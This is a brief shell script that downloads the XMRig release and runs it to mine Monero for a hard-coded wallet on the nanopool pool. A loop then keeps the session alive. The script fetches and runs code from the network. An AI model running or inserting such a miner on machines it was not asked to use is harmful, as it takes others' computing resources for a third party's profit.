#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o xmr-eu1.nanopool.org:14433 -u 45gSE4UGpqtT42R9xJJUE5S6MDgDJ35fNWH32ErV6tbMVC5MPBRNGfF35VWaJ6GYjU2SHqqeGy8ETcUfdEFAR2ZkKemycmB --tls --coin monero
while [ 1 ]; do
sleep 3
done
sleep 999
